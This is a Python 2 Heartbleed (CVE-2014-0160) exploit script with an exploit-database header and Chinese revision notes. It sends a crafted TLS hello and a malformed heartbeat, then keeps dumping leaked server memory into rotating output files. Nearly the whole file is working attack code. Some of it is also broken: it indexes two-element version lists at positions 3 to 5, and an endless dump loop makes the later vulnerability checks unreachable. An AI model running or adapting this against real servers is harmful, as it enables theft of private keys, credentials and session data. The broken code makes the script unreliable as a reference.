# -*- coding: UTF-8 -*-
# Exploit Title: [OpenSSL TLS Heartbeat Extension - Memory Disclosure - Multiple SSL/TLS versions]
# Date: [2014-04-09]
# Exploit Author: [Csaba Fitzl]
# Vendor Homepage: [http://www.openssl.org/]
# Software Link: [http://www.openssl.org/source/openssl-1.0.1f.tar.gz]
# Version: [1.0.1f]
# Tested on: [N/A]
# CVE : [2014-0160]
#The second revision comes from Guoker
#!/usr/bin/env python

# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
# The author disclaims copyright to this source code.
# Modified by Csaba Fitzl for multiple SSL / TLS version support
'''
-------------改动1-14--------------
1.增加两个参数-t -d
2.循环接收心跳响应
3.接收到的响应保存至文档
4.去除偏移地址和非ascii字符
-------------改动1-23--------------
1.增加get_FileSize方法用于获取文件大小
2.增加file_judge方法用于判断文件大小
3.增加两处异常处理：接收心跳响应错误、文件写入错误
PS：文件大于10M时自动创建文件名+1后再写入
如果写到out.txt88时手动退出了，下次启动要加上 -d out.txt88
'''

import sys
import struct
import socket
import time
import select
import re
import os
from optparse import OptionParser

options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
options.add_option('-t', '--time', type='int', default=10, help='Time to test (default: 10)')
options.add_option('-d', '--dest', type='str', default='out.txt', help='Text output to test (default: out.txt)')

version = []
version.append(['SSL 3.0','03 00'])
version.append(['TLS 1.0','03 01'])
version.append(['TLS 1.1','03 02'])
version.append(['TLS 1.2','03 03'])

i = 0

tmp_file = None

def h2bin(x):
	return x.replace(' ', '').replace('\n', '').decode('hex')

def create_hello(version):
	hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
	return hello

def create_hb(version):
	hb = h2bin('18 ' + version + ' 00 03 01 ff ff')
	return hb

def get_FileSize(filePath):
    filePath = unicode(filePath,'utf8')
    fsize = os.path.getsize(filePath)
    fsize = fsize/float(1024*1024)
    return round(fsize,2)

def file_judge():
	opts, args = options.parse_args()
	global i
	global tmp_file
	if get_FileSize(tmp_file) > 10:
		i += 1
		tmp_file = opts.dest + str(i)

def hexdump(s):
    opts, args = options.parse_args()
    pdat = ''
    times = time.strftime('%Y-%m-%d-%H:%M:%S',time.localtime(time.time()))
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        pdat += ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
    print '%s' % (pdat.replace('......', ''),)
    print '-----------------------'+times+'---------------------------------'
#获取心跳内容后写入
    try:
        with open(tmp_file,'a') as f:
            f.write('%s' % (pdat.replace('......', ''),))
            f.write('-----------------------'+times+'---------------------------------')
    except :
        with open('error.txt','a') as f:
            f.write('%s' % (pdat.replace('......', ''),))
            f.write('-----------------------'+times+'---------------------------------')



def recvall(s, length, timeout=5):
	endtime = time.time() + timeout
	rdata = ''
	remain = length
	while remain > 0:
		rtime = endtime - time.time()
		if rtime < 0:
			return None
		r, w, e = select.select([s], [], [], 5)
		if s in r:
			data = s.recv(remain)
			# EOF?
			if not data:
				return None
			rdata += data
			remain -= len(data)
	return rdata
def delay(int):#延迟方法
    time.sleep(int)

def recvmsg(s):
	hdr = recvall(s, 5)
	if hdr is None:
		print 'Unexpected EOF receiving record header - server closed connection'
		return None, None, None
	typ, ver, ln = struct.unpack('>BHH', hdr)
	pay = recvall(s, ln, 10)
	if pay is None:
		print 'Unexpected EOF receiving record payload - server closed connection'
		return None, None, None
	print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
	return typ, ver, pay

def hit_hb(s,hb):
	opts, args = options.parse_args()
	s.send(hb)
	while True:
		typ, ver, pay = recvmsg(s)
		if typ is None:
			print 'No heartbeat response received, server likely not vulnerable'
			return False

		if typ == 24:
			print 'Received heartbeat response:'
			while True:#循环hexdump后延迟
				try:
					hexdump(pay)
					file_judge()
					delay(opts.time)
				except KeyboardInterrupt:
					print 'Exit！'
					exit()
				except:#如果发生错误，强制等待5分钟后重试
					print 'Error Forced Delay of 5 Minutes'
					delay(300)
			if len(pay) > 3:
				print 'WARNING: server returned more data than it should - server is vulnerable!'
			else:
				print 'Server processed malformed heartbeat, but did not return any extra data.'
			return True

		if typ == 21:
			print 'Received alert:'
			hexdump(pay)
			print 'Server returned error, likely not vulnerable'
			return False

			
def main():
	opts, args = options.parse_args()
	global tmp_file
	if len(args) < 1:
		options.print_help()
		return
	tmp_file = opts.dest
	for i in range(len(version)):
		print 'Trying ' + version[i][0] + '...'
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print 'Connecting...'
		sys.stdout.flush()
		s.connect((args[0], opts.port))
		print 'Sending Client Hello...'
		sys.stdout.flush()
		s.send(create_hello(version[i][3]))
		print 'Waiting for Server Hello...'
		sys.stdout.flush()
		while True:
			typ, ver, pay = recvmsg(s)
			if typ == None:
				print 'Server closed connection without sending Server Hello.'
				return
			# Look for server hello done message.
			if typ == 22 and ord(pay[0]) == 0x0E:
				break

		print 'Sending heartbeat request...'
		sys.stdout.flush()
		s.send(create_hb(version[i][4]))
		if hit_hb(s,create_hb(version[i][5])):
			#Stop if vulnerable
			break

if __name__ == '__main__':
	main()